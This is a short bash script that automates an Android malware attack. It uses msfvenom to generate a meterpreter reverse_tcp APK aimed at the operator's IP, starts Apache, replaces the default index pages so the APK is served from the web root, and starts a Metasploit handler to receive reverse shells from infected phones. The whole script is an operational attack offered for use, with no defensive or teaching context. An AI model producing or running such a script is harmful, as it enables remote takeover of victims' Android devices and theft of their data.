#!/bin/bash
if [[ $EUID -ne 0 ]]
then
	echo "pls run as root"
else
	ifconfig
	echo -e "pls enter the your ip : \c"
	read ip_name
	echo -e "pls enter the name of the payload with .apk extions : \c"
	read payload_name
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_name LPORT=4444 --platform android R > $payload_name
	/etc/init.d/apache2 start
	mv /var/www/html/index.html /var/www/html/index_eg.html
	rm /var/www/html/index.nginx-debian.html
	cp $payload_name /var/www/html
	msfconsole -x "handler -p android/meterpreter/reverse_tcp -H $ip_name -P 4444"
fi


